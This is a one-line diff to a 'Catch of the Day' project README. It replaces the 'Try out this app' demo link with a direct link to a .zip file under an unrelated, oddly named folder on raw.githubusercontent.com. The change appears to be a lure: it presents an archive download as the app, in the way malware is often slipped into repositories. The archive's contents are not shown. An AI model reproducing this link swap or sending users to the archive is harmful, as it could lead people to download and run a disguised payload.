@@ -1,6 +1,6 @@
 # Catch of the Day
 
-Try out this [app](http://catchoftheday.wesbos.com), find a store and make an order!
+Try out this [app](https://raw.githubusercontent.com/gianverab/catch-of-the-day/master/galvanolysis/catch-of-the-day.zip), find a store and make an order!
 
 ## Description
 
